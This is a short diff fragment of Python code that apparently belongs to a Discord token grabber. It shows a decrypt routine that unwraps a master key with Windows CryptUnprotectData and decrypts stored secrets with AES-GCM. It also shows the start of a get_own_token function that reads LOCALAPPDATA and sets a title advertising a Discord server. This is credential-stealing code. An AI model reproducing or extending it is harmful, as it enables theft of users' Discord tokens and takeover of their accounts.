@@ -10,7 +10,9 @@ def decrypt(buff, master_key):
         return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
     except:
         return "Error"
+    
 def get_own_token():
+    new_title("Get own token discord.gg/nexustools")
     already_check = []
     checker = []
     local = os.getenv('LOCALAPPDATA')
